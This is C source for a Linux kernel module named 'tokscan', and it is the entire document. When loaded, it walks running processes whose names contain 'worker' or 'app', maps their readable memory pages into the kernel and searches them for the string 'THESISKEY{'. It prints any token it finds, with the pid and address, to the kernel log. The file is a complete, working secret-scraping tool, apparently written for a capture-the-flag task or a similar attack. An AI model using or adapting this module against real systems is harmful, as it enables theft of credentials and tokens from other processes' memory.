MODULE_LICENSE("GPL");

static const char pat[] = "THESISKEY{";
#define PATLEN 10

static void scan_page(struct task_struct *t, unsigned long addr, char *kaddr)
{
    int i;
    for (i = 0; i + PATLEN + 80 < PAGE_SIZE; i++) {
        if (kaddr[i]=='T' && !memcmp(kaddr+i, pat, PATLEN)) {
            char out[96]; int j;
            for (j=0;j<90 && (i+j)<PAGE_SIZE;j++){
                char c=kaddr[i+j];
                out[j]=(c>=32&&c<127)?c:0;
                if(out[j]==0) break;
            }
            out[j]=0;
            pr_info("tokscan: pid=%d comm=%s addr=%lx: %s\n", t->pid, t->comm, addr+i, out);
        }
    }
}

static void scan_task(struct task_struct *t)
{
    struct mm_struct *mm;
    struct vm_area_struct *vma;
    mm = get_task_mm(t);
    if (!mm) return;
    down_read(&mm->mmap_lock);
    for (vma = mm->mmap; vma; vma = vma->vm_next) {
        unsigned long addr;
        if (!(vma->vm_flags & VM_READ)) continue;
        for (addr = vma->vm_start; addr < vma->vm_end; addr += PAGE_SIZE) {
            struct page *page; void *kaddr; int locked=1; long r;
            r = get_user_pages_remote(mm, addr, 1, 0, &page, NULL, &locked);
            if (r != 1) { if(!locked){down_read(&mm->mmap_lock);locked=1;} continue; }
            kaddr = kmap(page);
            scan_page(t, addr, kaddr);
            kunmap(page);
            put_page(page);
            if (!locked){down_read(&mm->mmap_lock);}
        }
    }
    up_read(&mm->mmap_lock);
    mmput(mm);
}

static int __init m_init(void)
{
    struct task_struct *t;
    pr_info("tokscan: start\n");
    for_each_process(t) {
        if (strstr(t->comm, "worker") || strstr(t->comm, "app")) {
            pr_info("tokscan: scanning pid=%d comm=%s\n", t->pid, t->comm);
            scan_task(t);
        }
    }
    pr_info("tokscan: done\n");
    return 0;
}
static void __exit m_exit(void){ pr_info("tokscan: unload\n"); }
module_init(m_init);
module_exit(m_exit);
